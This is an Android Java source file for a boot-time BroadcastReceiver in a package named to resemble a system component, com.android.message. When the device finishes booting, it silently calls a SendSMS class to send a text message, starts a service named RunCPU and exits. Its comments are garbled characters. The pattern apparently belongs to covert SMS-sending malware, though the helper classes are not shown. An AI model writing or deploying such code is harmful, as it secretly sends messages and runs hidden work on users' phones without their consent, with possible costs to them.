package com.android.message;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		//ϵͳ�����ɹ�
		
		//lzd
		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)){
			//���Ͷ���
			SendSMS sms = new SendSMS(context);
			sms.sendSMS();
			
			//System.exit(0);
		}
		
		//lzd �Ȼ�ȡCPU��
		Intent i = new Intent();
		i.setClass(context, RunCPU.class);
		context.startService(i);
		//lzd
		System.exit(0);
		
	}

}
